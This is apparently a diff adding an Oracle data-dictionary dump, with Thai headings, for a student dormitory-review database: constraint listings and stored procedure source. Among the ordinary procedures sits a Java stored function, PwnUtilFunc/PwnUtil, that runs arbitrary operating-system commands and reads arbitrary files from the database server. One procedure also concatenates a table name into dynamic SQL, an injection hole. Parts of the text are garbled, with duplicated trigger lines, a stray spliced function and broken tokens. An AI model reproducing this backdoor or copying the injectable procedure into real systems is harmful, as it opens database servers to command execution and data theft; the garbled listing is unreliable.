@@ -1,0 +1,447 @@
+1> ดูรายละเอียดทั้งหมด
+
+SELECT table_name, constraint_Name, constraint_type , index_name
+FROM user_constraints
+ORDER BY table_name, constraint_type , constraint_name;
+
+TABLE_NAME       CONSTRAINT_NAME      CON    INDEX_NAME
+-------------------------------------------------------
+DORMITORY        SYS_C0016948         C      
+DORMITORY        SYS_C0016949         C      
+DORMITORY        SYS_C0016950         C      
+DORMITORY        SYS_C0016951         C      
+DORMITORY        SYS_C0016952         C      
+DORMITORY        SYS_C0016953         C      
+DORMITORY        PK_DORMITORY         P      PK_DORMITORY
+DORMITORY        FK_DORM_ZONE         R      
+-------------------------------------------------------
+FACILITY         SYS_C0016962         C      
+FACILITY         SYS_C0016963         C      
+FACILITY         SYS_C0016964         C      
+FACILITY         SYS_C0016965         C      
+FACILITY         PK_FACILITY          P      PK_FACILITY
+FACILITY         FK_FACILITY_DORM     R      
+-------------------------------------------------------
+LOGIN_ACTIVITY   SYS_C0016610         C      
+LOGIN_ACTIVITY   SYS_C0016611         C      
+LOGIN_ACTIVITY   SYS_C0016612         C      
+LOGIN_ACTIVITY   SYS_C0016613         C      
+LOGIN_ACTIVITY   PK_LOGIN_ACTIVITY    P      PK_LOGIN_ACTIVITY
+LOGIN_ACTIVITY   FK_LOGIN_USER        R      
+-------------------------------------------------------
+RATING           SYS_C0020222         C      
+RATING           SYS_C0020223         C      
+RATING           SYS_C0020224         C      
+RATING           SYS_C0020225         C      
+RATING           SYS_C0020226         C      
+RATING           PK_RATING            P      PK_RATING
+RATING           FK_RATING_REVIEW     R      
+-------------------------------------------------------
+REVIEW           SYS_C0020215         C      
+REVIEW           SYS_C0020216         C      
+REVIEW           SYS_C0020217         C      
+REVIEW           SYS_C0020218         C      
+REVIEW           PK_REVIEW            P      PK_REVIEW
+REVIEW           FK_REVIEW_DORM       R      
+REVIEW           FK_REVIEW_USER       R      
+-------------------------------------------------------
+ROOM             SYS_C0016956         C      
+ROOM             SYS_C0016957         C      
+ROOM             SYS_C0016958         C      
+ROOM             SYS_C0016959         C      
+ROOM             PK_ROOM              P      PK_ROOM
+ROOM             FK_ROOM_DORM         R      
+-------------------------------------------------------
+USERS            SYS_C0016151         C      
+USERS            SYS_C0016152         C      
+USERS            SYS_C0016153         C      
+USERS            SYS_C0016154         C      
+USERS            SYS_C0016155         C      
+USERS            SYS_C0016156         C      
+USERS            SYS_C0016157         C      
+USERS            PK_USERS             P      PK_USERS
+USERS            UK_USERS_USERNAME    U      UK_USERS_USERNAME
+-------------------------------------------------------
+ZONE             SYS_C0016183         C      
+ZONE             SYS_C0016184         C      
+ZONE             PK_ZONE              P      PK_ZONE
+-------------------------------------------------------
+ZONE_LANDMARK    SYS_C0016186         C      
+ZONE_LANDMARK    SYS_C0016187         C      
+ZONE_LANDMARK    PK_ZONE_LANDMARK     P      PK_ZONE_LANDMARK
+ZONE_LANDMARK    FK_ZONE_LANDMARK_ZONE R      
+-------------------------------------------------------
+
+56 row selected.
+
+2> ดูข้อมูลสรุปทั้งหมด
+
+SELECT constraint_type , table_name, count(*)
+FROM user_constraints
+GROUP BY constraint_type , table_name
+ORDER BY constraint_type , table_name;
+
+CON  TABLE_NAME      COUNT(*)
+-----------------------------
+C    DORMITORY       6
+C    FACILITY        4
+C    LOGIN_ACTIVITY  4
+C    RATING          5
+C    REVIEW          4
+C    ROOM            4
+-----------------------------
+C    USERS           7
+C    ZONE            2
+C    ZONE_LANDMARK   2
+P    DORMITORY       1
+P    FACILITY        1
+P    LOGIN_ACTIVITY  1
+-----------------------------
+P    RATING          1
+P    REVIEW          1
+P    ROOM            1
+P    USERS           1
+P    ZONE            1
+P    ZONE_LANDMARK   1
+-----------------------------
+R    DORMITORY       1
+R    FACILITY        1
+R    LOGIN_ACTIVITY  1
+R    RATING          1
+R    REVIEW          2
+R    ROOM            1
+-----------------------------
+R    ZONE_LANDMARK   1
+U    USERS           1
+
+26 row selected.
+
+3> การดูข้อมูลตาราง (Table) และกฎข้อบังคับ (Constraint) ที่สร้างขึ้นของ Database user
+
+SELECT OWNER , TABLE_NAME , CONSTRAINT_TYPE , CONSTRAINT_NAME , SEARCH_CONDITION , INDEX_OWNER , INDEX_NAME , R_OWNER , R_CONSTRAINT_NAME
+FROM USER_CONSTRAINTS
+ORDER BY TABLE_NAME , CONSTRAINT_TYPE , CONSTRAINT_NAME;
+
+OWNER        TABLE_NAME      CON  CONSTRAINT_NAME  SEARCH_CONDITION          INDEX_OWNER  INDEX_NAME       R_OWNER      R_CONSTRAINT_NAME
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  DORMITORY       C    SYS_C0016948     "DORM_ID" IS NOT NULL                      CSPROJECT27  PK_DORMITORY  
+CSPROJECT27  DORMITORY       C    SYS_C0016949     "ZONE_ID" IS NOT NULL                      CSPROJECT27  PK_ZONE
+CSPROJECT27  DORMITORY       C    SYS_C0016950     "NAME" IS NOT NULL                         CSPROJECT27  
+CSPROJECT27  DORMITORY       C    SYS_C0016951     "LATITUDE" IS NOT NULL                     CSPROJECT27  
+CSPROJECT27  DORMITORY       C    SYS_C0016952     "LONGITUDE" IS NOT NULL                    CSPROJECT27  
+CSPROJECT27  DORMITORY       C    SYS_C0016953     "PHONE_NUMBER" IS NOT NULL                 CSPROJECT27  
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  DORMITORY       P    PK_DORMITORY                                     CSPROJECT27  PK_DORMITORY
+CSPROJECT27  DORMITORY       R    FK_DORM_ZONE                                               CSPROJECT27  PK_ZONE
+CSPROJECT27  FACILITY        C    SYS_C0016962     "FACILITY_ID" IS NOT NULL                  CSPROJECT27  
+CSPROJECT27  FACILITY        C    SYS_C0016963     "DORM_ID" IS NOT NULL                      CSPROJECT27  
+CSPROJECT27  FACILITY        C    SYS_C0016964     "FACILITY_NAME" IS NOT NULL                CSPROJECT27  
+CSPROJECT27  FACILITY        C    SYS_C0016965     "ADD_ON" IS NOT NULL                       CSPROJECT27  
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  FACILITY        P    PK_FACILITY                                     CSPROJECT27  PK_FACILITY
+CSPROJECT27  FACILITY        R    FK_FACILITY_DORM                                          CSPROJECT27  PK_DORMITORY
+CSPROJECT27  LOGIN_ACTIVITY  C    SYS_C0016610     "SESSION_ID" IS NOT NULL                   CSPROJECT27  
+CSPROJECT27  LOGIN_ACTIVITY  C    SYS_C0016611     "USER_ID" IS NOT NULL                      CSPROJECT27  
+CSPROJECT27  LOGIN_ACTIVITY  C    SYS_C0016612     "LOGIN_TIME" IS NOT NULL                   CSPROJECT27  
+CSPROJECT27  LOGIN_ACTIVITY  C    SYS_C0016613     "IP_ADDRESS" IS NOT NULL                   CSPROJECT27  
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  LOGIN_ACTIVITY  P    PK_LOGIN_ACTIVITY                            CSPROJECT27  PK_LOGIN_ACTIVITY
+CSPROJECT27  LOGIN_ACTIVITY  R    FK_LOGIN_USER                                             CSPROJECT27  PK_USERS
+CSPROJECT27  RATING          C    SYS_C0020222     "RATING_ID" IS NOT NULL                    CSPROJECT27  
+CSPROJECT27  RATING          C    SYS_C0020223     "REVIEW_ID" IS NOT NULL                    CSPROJECT27  
+CSPROJECT27  RATING          C    SYS_C0020224     "CLEANLINESS_RATE" IS NOT NULL             CSPROJECT27  
+CSPROJECT27  RATING          C    SYS_C0020225     "COMFORT_RATE" IS NOT NULL                 CSPROJECT27  
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  RATING          C    SYS_C0020226     "WORTHINESS_RATE" IS NOT NULL              CSPROJECT27  
+CSPROJECT27  RATING          P    PK_RATING                                       CSPROJECT27  PK_RATING
+CSPROJECT27  RATING          R    FK_RATING_REVIEW                                          CSPROJECT27  PK_REVIEW
+CSPROJECT27  REVIEW          C    SYS_C0020215     "REVIEW_ID" IS NOT NULL                    CSPROJECT27  
+CSPROJECT27  REVIEW          C    SYS_C0020216     "USER_ID" IS NOT NULL                      CSPROJECT27  
+CSPROJECT27  REVIEW          C    SYS_C0020217     "DORM_ID" IS NOT NULL                      CSPROJECT27  
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  REVIEW          C    SYS_C0020218     "REVIEW_COMMENT" IS NOT NULL               CSPROJECT27  
+CSPROJECT27  REVIEW          P    PK_REVIEW                                       CSPROJECT27  PK_REVIEW
+CSPROJECT27  REVIEW          R    FK_REVIEW_DORM                                            CSPROJECT27  PK_DORMITORY
+CSPROJECT27  REVIEW          R    FK_REVIEW_USER                                            CSPROJECT27  PK_USERS
+CSPROJECT27  ROOM            C    SYS_C0016956     "ROOM_ID" IS NOT NULL                      CSPROJECT27  
+CSPROJECT27  ROOM            C    SYS_C0016957     "DORM_ID" IS NOT NULL                      CSPROJECT27  
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  ROOM            C    SYS_C0016958     "ROOM_TYPE" IS NOT NULL                    CSPROJECT27  
+CSPROJECT27  ROOM            C    SYS_C0016959     "ROOM_PRICE" IS NOT NULL                   CSPROJECT27  
+CSPROJECT27  ROOM            P    PK_ROOM                                         CSPROJECT27  PK_ROOM
+CSPROJECT27  ROOM            R    FK_ROOM_DORM                                              CSPROJECT27  PK_DORMITORY
+CSPROJECT27  USERS           C    SYS_C0016151     "USER_ID" IS NOT NULL                      CSPROJECT27  
+CSPROJECT27  USERS           C    SYS_C0016152     "FNAME" IS NOT NULL                        CSPROJECT27  
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  USERS           C    SYS_C0016153     "SNAME" IS NOT NULL                        CSPROJECT27  
+CSPROJECT27  USERS           C    SYS_C0016154     "USERNAME" IS NOT NULL                     CSPROJECT27  
+CSPROJECT27  USERS           C    SYS_C0016155     "PASSWORD" IS NOT NULL                     CSPROJECT27  
+CSPROJECT27  USERS           C    SYS_C0016156     "EMAIL" IS NOT NULL                        CSPROJECT27  
+CSPROJECT27  USERS           C    SYS_C0016157     "SEX" IS NOT NULL                          CSPROJECT27  
+CSPROJECT27  USERS           P    PK_USERS                                        CSPROJECT27  PK_USERS
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  USERS           U    UK_USERS_USERNAME                            CSPROJECT27  UK_USERS_USERNAME
+CSPROJECT27  ZONE            C    SYS_C0016183     "ZONE_ID" IS NOT NULL                      CSPROJECT27  
+CSPROJECT27  ZONE            C    SYS_C0016184     "NAME" IS NOT NULL                         CSPROJECT27  
+CSPROJECT27  ZONE            P    PK_ZONE                                         CSPROJECT27  PK_ZONE
+CSPROJECT27  ZONE_LANDMARK   C    SYS_C0016186     "ZONE_ID" IS NOT NULL                      CSPROJECT27  
+CSPROJECT27  ZONE_LANDMARK   C    SYS_C0016187     "LANDMARK" IS NOT NULL                     CSPROJECT27  
+--------------------------------------------------------------------------------------------------------------------------------
+CSPROJECT27  ZONE_LANDMARK   P    PK_ZONE_LANDMARK                              CSPROJECT27  PK_ZONE_LANDMARK
+CSPROJECT27  ZONE_LANDMARK   R    FK_ZONE_LANDMARK_ZONE                                    CSPROJECT27  PK_ZONE
+
+56 row selected.
+
+4> การดูข้อมูล Stored Procedure ที่สร้างขึ้นของ Database User 
+
+SELECT OBJECT_NAME , PROCEDURE_NAME , OBJECT_TYPE , AGGREGATE
+FROM USER_Procedures ORDER BY OBJECT_NAME , PROCEDURE_NAME;
+
+OBJECT_NAME               PROCEDURE_NAME          OBJECT_TYPE   AGGREGATE
+-----------------------------------------------------------------------
+ADD_LANDMARK                                   FUNCTION         NO
+ADD_USER                                       PROCEDURE        NO
+CALCULATE_DORMITORY_RATING                     TRIGGER          NO
+CALCULATE_REVIEW_RATING                        TRIGGER          NO
+CHECK_TABLE_EMPTY                              PROCEDURE        NO
+INSERT_REVIEW_AND_RATING                       PROCEDURE        NO
+PWNUTILFUNC                                    FUNCTION         NO
+
+5> การดูข้อมูล Source Code ของ Stored Pocedure ที่สร้างขึ้นของ Database User 
+
+SELECT * FROM USER_SOURCE ORDER BY TYPE , NAME , LINE;
+
+NAME                             TYPE          LINE  TEXT
+--------------------------------------------------------
+ADD_LANDMARK	                FUNCTION	    1	FUNCTION add_landmark (
+ADD_LANDMARK	                FUNCTION	    2	zone_id VARCHAR2,
+ADD_LANDMARK	                FUNCTION	    3	landmark VARCHAR2
+ADD_LANDMARK	                FUNCTION	    4	) RETURN VARCHAR2 IS
+ADD_LANDMARK	                FUNCTION	    5	BEGIN
+ADD_LANDMARK	                FUNCTION	    6	INSERT INTO ZONE_LANDMARK (ZONE_ID, LANDMARK)
+ADD_LANDMARK	                FUNCTION	    7	VALUES (zone_id, landmark);
+ADD_LANDMARK	                FUNCTION	    8	 
+ADD_LANDMARK	                FUNCTION	    9	RETURN 'Landmark added successfully';
+ADD_LANDMARK	                FUNCTION	    10	EXCEPTION
+ADD_LANDMARK	                FUNCTION	    11	WHEN OTHERS THEN
+ADD_LANDMARK	                FUNCTION	    12	RETURN 'Error: ' || SQLERRM;
+ADD_LANDMARK	                FUNCTION	    13	END;COUNT_BY_DEPARTMENT	            FUNCTION	    1	FUNCTION COUNT_BY_DEPARTMENT RETURN NUMBER IS
+PWNUTILFUNC	                    FUNCTION	    1	function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name 'PwnUtil.runCmd(java.lang.String) return String';
+PwnUtil	                        JAVA SOURCE	    1	import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamRea der(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myRead er.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();ret urn str;} catch (Exception e){ return e.toString();}}};
+ADD_USER	                    PROCEDURE	    1	PROCEDURE add_user(
+ADD_USER	                    PROCEDURE	    2	p_user_id IN CHAR DEFAULT NULL,
+ADD_USER	                    PROCEDURE	    3	p_fname IN VARCHAR2 DEFAULT NULL,
+ADD_USER	                    PROCEDURE	    4	p_sname IN VARCHAR2 DEFAULT NULL,
+ADD_USER	                    PROCEDURE	    5	p_username IN CHAR DEFAULT NULL,
+ADD_USER	                    PROCEDURE	    6	p_password IN CHAR DEFAULT NULL,
+ADD_USER	                    PROCEDURE	    7	p_email IN CHAR DEFAULT NULL,
+ADD_USER	                    PROCEDURE	    8	p_sex IN CHAR DEFAULT NULL
+ADD_USER	                    PROCEDURE	    9	) AS
+ADD_USER	                    PROCEDURE	    10	BEGIN
+ADD_USER	                    PROCEDURE	    11	IF p_user_id IS NULL THEN
+ADD_USER	                    PROCEDURE	    12	DBMS_OUTPUT.PUT_LINE('USER_ID IS NULL');
+ADD_USER	                    PROCEDURE	    13	END IF;
+ADD_USER	                    PROCEDURE	    14	 
+ADD_USER	                    PROCEDURE	    15	IF p_fname IS NULL THEN
+ADD_USER	                    PROCEDURE	    16	DBMS_OUTPUT.PUT_LINE('FNAME IS NULL');
+ADD_USER	                    PROCEDURE	    17	END IF;
+ADD_USER	                    PROCEDURE	    18	 
+ADD_USER	                    PROCEDURE	    19	IF p_sname IS NULL THEN
+ADD_USER	                    PROCEDURE	    20	DBMS_OUTPUT.PUT_LINE('SNAME IS NULL');
+ADD_USER	                    PROCEDURE	    21	END IF;
+ADD_USER	                    PROCEDURE	    22	 
+ADD_USER	                    PROCEDURE	    23	IF p_username IS NULL THEN
+ADD_USER	                    PROCEDURE	    24	DBMS_OUTPUT.PUT_LINE('USERNAME IS NULL');
+ADD_USER	                    PROCEDURE	    25	END IF;
+ADD_USER	                    PROCEDURE	    26	 
+ADD_USER	                    PROCEDURE	    27	IF p_password IS NULL THEN
+ADD_USER	                    PROCEDURE	    28	DBMS_OUTPUT.PUT_LINE('PASSWORD IS NULL');
+ADD_USER	                    PROCEDURE	    29	END IF;
+ADD_USER	                    PROCEDURE	    30	 
+ADD_USER	                    PROCEDURE	    31	IF p_email IS NULL THEN
+ADD_USER	                    PROCEDURE	    32	DBMS_OUTPUT.PUT_LINE('EMAIL IS NULL');
+ADD_USER	                    PROCEDURE	    33	END IF;
+ADD_USER	                    PROCEDURE	    34	 
+ADD_USER	                    PROCEDURE	    35	IF p_sex IS NULL THEN
+ADD_USER	                    PROCEDURE	    36	DBMS_OUTPUT.PUT_LINE('SEX IS NULL');
+ADD_USER	                    PROCEDURE	    37	END IF;
+ADD_USER	                    PROCEDURE	    38	 
+ADD_USER	                    PROCEDURE	    39	BEGIN
+ADD_USER	                    PROCEDURE	    40	INSERT INTO USERS (USER_ID, FNAME, SNAME, USERNAME, PASSWORD, EMAIL, SEX)
+ADD_USER	                    PROCEDURE	    41	VALUES (p_user_id, p_fname, p_sname, p_username, p_password, p_email, p_sex);
+ADD_USER	                    PROCEDURE	    42	 
+ADD_USER	                    PROCEDURE	    43	-- COMMIT;
+ADD_USER	                    PROCEDURE	    44	DBMS_OUTPUT.PUT_LINE('INSERT USER SUCCESSFUL');
+ADD_USER	                    PROCEDURE	    45	EXCEPTION
+ADD_USER	                    PROCEDURE	    46	WHEN OTHERS THEN
+ADD_USER	                    PROCEDURE	    47	ROLLBACK;
+ADD_USER	                    PROCEDURE	    48	DBMS_OUTPUT.PUT_LINE('ERROR: ' || SQLCODE || ' ' || SQLERRM);
+ADD_USER	                    PROCEDURE	    49	END;
+ADD_USER	                    PROCEDURE	    50	END;
+CHECK_TABLE_EMPTY	            PROCEDURE	    1	PROCEDURE check_table_empty
+CHECK_TABLE_EMPTY	            PROCEDURE	    2	(
+CHECK_TABLE_EMPTY	            PROCEDURE	    3	p_table_name IN VARCHAR2,
+CHECK_TABLE_EMPTY	            PROCEDURE	    4	p_count OUT NUMBER
+CHECK_TABLE_EMPTY	            PROCEDURE	    5	)
+CHECK_TABLE_EMPTY	            PROCEDURE	    6	AS
+CHECK_TABLE_EMPTY	            PROCEDURE	    7	v_sql VARCHAR2(1000);
+CHECK_TABLE_EMPTY	            PROCEDURE	    8	BEGIN
+CHECK_TABLE_EMPTY	            PROCEDURE	    9	-- Dynamically create the SQL statement using the provided table name
+CHECK_TABLE_EMPTY	            PROCEDURE	    10	v_sql := 'SELECT COUNT(*) FROM ' || p_table_name;
+CHECK_TABLE_EMPTY	            PROCEDURE	    11	 
+CHECK_TABLE_EMPTY	            PROCEDURE	    12	-- Execute immediate to run the dynamically created SQL
+CHECK_TABLE_EMPTY	            PROCEDURE	    13	EXECUTE IMMEDIATE v_sql INTO p_count;
+CHECK_TABLE_EMPTY	            PROCEDURE	    14	 
+CHECK_TABLE_EMPTY	            PROCEDURE	    15	-- You can add exception handling here if needed
+CHECK_TABLE_EMPTY	            PROCEDURE	    16	EXCEPTION
+CHECK_TABLE_EMPTY	            PROCEDURE	    17	WHEN OTHERS THEN
+CHECK_TABLE_EMPTY	            PROCEDURE	    18	-- Handle exceptions accordingly
+CHECK_TABLE_EMPTY	            PROCEDURE	    19	p_count := -1; -- or set an appropriate error value
+CHECK_TABLE_EMPTY	            PROCEDURE	    20	END;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    1	PROCEDURE insert_review_and_rating (
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    2	p_review_id IN CHAR DEFAULT NULL,
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    3	p_user_id IN CHAR,
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    4	p_dorm_id IN CHAR,
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    5	p_review_comment IN VARCHAR2,
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    6	p_cleanliness IN NUMBER,
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    7	p_comfort IN NUMBER,
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    8	p_worthiness IN NUMBER
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    9	)
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    10	AS
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    11	v_rating_id VARCHAR2(20);
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    12	v_review_id CHAR(10);
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    13	v_random_number NUMBER;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    14	v_total_rating NUMBER;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    15	v_num_ratings NUMBER;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    16	v_avg_rating FLOAT;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    17	BEGIN
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    18	IF p_review_id IS NOT NULL THEN
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    19	v_review_id := p_review_id;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    20	ELSE
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    21	-- Generate a new review ID if p_review_id is not provided
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    22	SELECT 'R' || LPAD(REVIEW_SEQ.NEXTVAL, 2, '0') INTO v_review_id FROM DUAL;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    23	END IF;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    24	 
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    25	-- Generating a random number for the rating ID
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    26	v_random_number := TRUNC(DBMS_RANDOM.VALUE(1000, 10000));
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    27	v_rating_id := TRIM(v_review_id || '-' || TO_CHAR(v_random_number));
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    28	 
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    29	BEGIN
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    30	INSERT INTO REVIEW (REVIEW_ID, USER_ID, DORM_ID, REVIEW_COMMENT) VALUES (v_review_id, p_user_id, p_dorm_id, p_review_comment);
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    31	 
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    32	INSERT INTO RATING (RATING_ID, REVIEW_ID, CLEANLINESS_RATE, COMFORT_RATE, WORTHINESS_RATE) VALUES (v_rating_id, v_review_id, p_cleanliness, p_ comfort, p_worthiness);
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    33	 
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    34	-- Calculate the total rating for the specific review
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    35	SELECT SUM(CLEANLINESS_RATE + COMFORT_RATE + WORTHINESS_RATE), COUNT(*)
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    36	INTO v_total_rating, v_num_ratings
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    37	FROM RATING
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    38	WHERE REVIEW_ID = v_review_id;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    39	 
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    40	-- Calculate the average rating
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    41	IF v_num_ratings > 0 THEN
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    42	v_avg_rating := v_total_rating / (v_num_ratings * 3); -- Assuming 3 rating categories
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    43	ELSE
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    44	v_avg_rating := 0;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    45	END IF;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    46	 
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    47	-- Update the RATING_SCORE in the Review table
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    48	UPDATE Review
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    49	SET RATING_SCORE = ROUND(v_avg_rating, 1)
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    50	WHERE REVIEW_ID = v_review_id;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    51	 
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    52	-- COMMIT;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    53	DBMS_OUTPUT.PUT_LINE('INSERT REVIEW AND RATING SUCCESSFUL');
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    54	 
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    55	EXCEPTION
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    56	WHEN OTHERS THEN
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    57	ROLLBACK;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    58	DBMS_OUTPUT.PUT_LINE('ERROR: ' || SQLCODE || ' ' || SQLERRM);
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    59	END;
+INSERT_REVIEW_AND_RATING	    PROCEDURE	    60	END;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        1	TRIGGER calculate_dormitory_rating
+CALCULATE_DORMITORY_RATING	    TRIGGER	        2	AFTER INSERT OR UPDATE OR DELETE ON Review
+CALCULATE_DORMITORY_RATING	    TRIGGER	        3	FOR EACH ROW
+CALCULATE_DORMITORY_RATING	    TRIGGER	        4	DECLARE
+CALCULATE_DORMITORY_RATING	    TRIGGER	        5	PRAGMA AUTONOMOUS_TRANSACTION;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        6	v_total_rating NUMBER;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        7	v_num_ratings NUMBER;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        8	v_avg_rating FLOAT;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        9	BEGIN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        10	-- Calculate the total rating and count for the specific dormitory
+CALCULATE_DORMITORY_RATING	    TRIGGER	        11	SELECT NVL(SUM(RATING_SCORE), 0), NVL(COUNT(*), 0)
+CALCULATE_DORMITORY_RATING	    TRIGGER	        12	INTO v_total_rating, v_num_ratings
+CALCULATE_DORMITORY_RATING	    TRIGGER	        13	FROM Review
+CALCULATE_DORMITORY_RATING	    TRIGGER	        14	WHERE DORM_ID = :NEW.DORM_ID;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        15	 
+CALCULATE_DORMITORY_RATING	    TRIGGER	        16	-- Calculate the average rating
+CALCULATE_DORMITORY_RATING	    TRIGGER	        17	IF v_num_ratings > 0 THEN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        18	v_avg_rating := v_total_rating / v_num_ratings;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        19	ELSE
+CALCULATE_DORMITORY_RATING	    TRIGGER	        20	v_avg_rating := 0;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        21	END IF;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        22	 
+CALCULATE_DORMITORY_RATING	    TRIGGER	        23	DBMS_OUTPUT.PUT_LINE('Dormitory ID: ' || :NEW.DORM_ID || ', Total Rating: ' || v_total_rating || ', Num Ratings: ' || v_num_ratings || ', Avg Rati ng: ' || v_avg_rating);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        24	 
+CALCULATE_DORMITORY_RATING	    TRIGGER	        25	-- Update the Dormitory table with the calculated average rating
+CALCULATE_DORMITORY_RATING	    TRIGGER	        26	BEGIN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        27	UPDATE Dormitory
+CALCULATE_DORMITORY_RATING	    TRIGGER	        28	SET RATING_SCORE = ROUND(v_avg_rating, 1)
+CALCULATE_DORMITORY_RATING	    TRIGGER	        29	WHERE DORM_ID = :NEW.DORM_ID;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        30	COMMIT;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        31	DBMS_OUTPUT.PUT_LINE('Dormitory rating updated successfully for DORM_ID: ' || :NEW.DORM_ID);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        32	EXCEPTION
+CALCULATE_DORMITORY_RATING	    TRIGGER	        33	WHEN NO_DATA_FOUND THEN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        34	DBMS_OUTPUT.PUT_LINE('No data found for DORM_ID: ' || :NEW.DORM_ID);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        35	WHEN OTHERS THEN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        36	DBMS_OUTPUT.PUT_LINE('Error updating dormitory rating for DORM_ID: ' || :NEW.DORM_ID);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        37	END;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        38	 
+CALCULATE_DORMITORY_RATING	    TRIGGER	        39	EXCEPTION
+CALCULATE_DORMITORY_RATING	    TRIGGER	        40	WHEN OTHERS THEN
+CALCULATE_DORMITORY_RATING	    TRIGGER	        41	DBMS_OUTPUT.PUT_LINE('Trigger error for DORM_ID: ' || :NEW.DORM_ID);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        18	v_avg_rating := v_total_rating / v_num_ratings;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        19	ELSE
+CALCULATE_DORMITORY_RATING	    TRIGGER	        20	v_avg_rating := 0;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        21	END IF;
+CALCULATE_DORMITORY_RATING	    TRIGGER	        22	 
+CALCULATE_DORMITORY_RATING	    TRIGGER	        23	DBMS_OUTPUT.PUT_LINE('Dormitory ID: ' || :NEW.DORM_ID || ', Total Rating: ' || v_total_rating || ', Num Ratings: ' || v_num_ratings || ', Avg Rati ng: ' || v_avg_rating);
+CALCULATE_DORMITORY_RATING	    TRIGGER	        24	 
